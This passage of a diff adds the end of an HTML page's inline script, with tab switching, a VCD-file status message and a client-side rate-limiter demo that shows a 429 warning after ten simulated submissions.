+  document.getElementById('rate-msg').textContent = 'VCD file — served from MongoDB, always available!';
+  setTimeout(() => { document.getElementById('rate-msg').textContent = ''; }, 3000);
+}
+
+// ── Tab switching ──────────────────────────────────────────
+function switchTab(el, id) {
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+  el.classList.add('active');
+  document.getElementById(id).classList.add('active');
+}
+
+// ── Rate limiter demo ──────────────────────────────────────
+let subCount = 3;
+function addSubmission() {
+  subCount++;
+  const bar = document.getElementById('rate-bar');
+  const cnt = document.getElementById('rate-count');
+  const msg = document.getElementById('rate-msg');
+
+  if (subCount > 10) {
+    msg.style.color = '#EF4444';
+    msg.textContent = '429 Too Many Requests — rate limit exceeded! Resets in 60s.';
+    bar.style.background = '#EF4444';
+    bar.style.width = '100%';
+    cnt.style.color = '#EF4444';
+    cnt.textContent = '10+ / 10';
+  } else {
+    const pct = (subCount / 10 * 100) + '%';
+    bar.style.width = pct;
+    cnt.textContent = subCount + ' / 10';
+    if (subCount >= 8) {
+      bar.style.background = '#F59E0B';
+      msg.style.color = '#F59E0B';
+      msg.textContent = '⚠ Approaching rate limit';
+    } else {
+      bar.style.background = '#10B981';
+      msg.style.color = '#A1A1AA';
+      msg.textContent = 'Submission accepted ✓';
+    }
+    cnt.style.color = subCount >= 8 ? '#F59E0B' : '#10B981';
+  }
+  setTimeout(() => { if (subCount <= 10) msg.textContent = ''; }, 1500);
+}
+
+// Init on load
+window.addEventListener('load', () => {
+  setTimeout(renderWaveform, 100);
+});
+window.addEventListener('resize', renderWaveform);
+</script>
+</body>
+</html>
